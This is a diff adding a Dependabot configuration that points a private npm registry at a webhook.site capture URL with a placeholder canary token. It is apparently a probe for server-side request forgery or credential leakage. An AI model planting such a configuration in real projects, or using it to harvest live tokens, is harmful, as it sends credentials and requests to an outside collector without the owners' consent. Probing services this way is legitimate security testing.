@@ -1,0 +1,13 @@
+version: 2
+registries:
+  ssrf-probe:
+    type: npm-registry
+    url: https://webhook.site/5b89465e-0690-4c32-a916-16a01c3556c0
+    token: "CANARY_TOKEN_dependabot_ssrf_probe_12345"
+updates:
+  - package-ecosystem: npm
+    directory: "/"
+    schedule:
+      interval: daily
+    registries:
+      - ssrf-probe
